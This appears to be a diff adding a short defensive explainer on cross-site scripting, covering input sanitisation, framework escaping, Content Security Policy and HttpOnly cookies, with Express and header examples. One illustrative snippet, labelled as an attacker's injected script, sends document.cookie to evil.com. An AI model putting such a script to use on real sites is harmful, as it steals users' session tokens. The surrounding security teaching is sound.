@@ -1,0 +1,84 @@
+🔹 What is XSS (Cross-Site Scripting)?
+
+XSS is a type of security vulnerability found in web applications that allows attackers to inject malicious JavaScript code into web pages viewed by other users.
+
+When the browser runs that page, it also runs the attacker’s script, which can do harmful things like:
+
+Steal cookies or session tokens (to impersonate the user)
+
+Deface the website
+
+Redirect users to malicious sites
+
+Log keystrokes or steal data
+
+
+
+🔹 How to Prevent XSS
+
+✅ 1. Escape or sanitize user input
+Use libraries like:
+
+DOMPurify in JavaScript
+
+escape() utilities in backend frameworks
+
+✅ 2. Use framework protections
+React, Angular, and Vue automatically escape content in JSX/templates:
+
+<p>{userComment}</p> // safe in React
+
+
+But using dangerouslySetInnerHTML is risky.
+
+✅ 3. Use Content Security Policy (CSP)
+CSP can block inline scripts and only allow scripts from trusted sources.
+
+✅ 4. Don’t trust user input
+Always validate and sanitize before rendering or storing it.
+
+✅ 5. Use HttpOnly cookies
+Prevents JavaScript from reading cookies (reduces cookie theft risk).
+
+
+
+🍪 What is an HttpOnly Cookie?
+
+An HttpOnly cookie is a special type of browser cookie that cannot be accessed by JavaScript.
+
+It can only be sent between the browser and the server during HTTP(S) requests.
+
+That means:
+
+You can store sensitive information like authentication tokens in it.
+
+Attackers can’t steal it using XSS (because document.cookie can’t read it).
+
+🔐 Why it helps against XSS
+
+If an attacker injects malicious JavaScript on your site:
+
+// Attacker's injected script
+console.log(document.cookie);
+fetch("https://evil.com?cookie=" + document.cookie);
+
+
+Normally, this would send all cookies (including session tokens) to the attacker’s server.
+
+But if your cookies are marked as HttpOnly, then:
+
+document.cookie // ❌ will not show the HttpOnly cookie
+
+
+👉 So even though the attacker’s script executes, it cannot steal session data.
+
+⚙️ How to Set HttpOnly Cookies
+✅ Example in Express (Node.js)
+res.cookie("token", jwtToken, {
+  httpOnly: true,   // prevents JavaScript access
+  secure: true,     // only over HTTPS
+  sameSite: "strict" // helps prevent CSRF
+});
+
+✅ Example in a response header
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
